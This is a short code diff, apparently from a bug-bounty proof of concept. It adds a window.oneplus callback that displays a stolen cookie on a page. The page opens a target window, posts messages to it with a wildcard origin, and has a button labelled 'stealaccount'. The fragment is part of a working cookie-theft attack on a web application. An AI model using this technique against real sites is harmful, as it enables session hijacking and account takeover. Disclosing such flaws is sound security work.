@@ -44,6 +44,10 @@ function sendMessage(){
 	h1Win.postMessage(data,"*");
 	}
 	
+ window.oneplus = function(cookie){
+        document.getElementById('cookie').innerHTML = cookie; 	
+    }
+	
 document.getElementById("openH1").addEventListener('click', openWin);
 document.getElementById("stealaccount").addEventListener('click', sendMessage);
 </script>
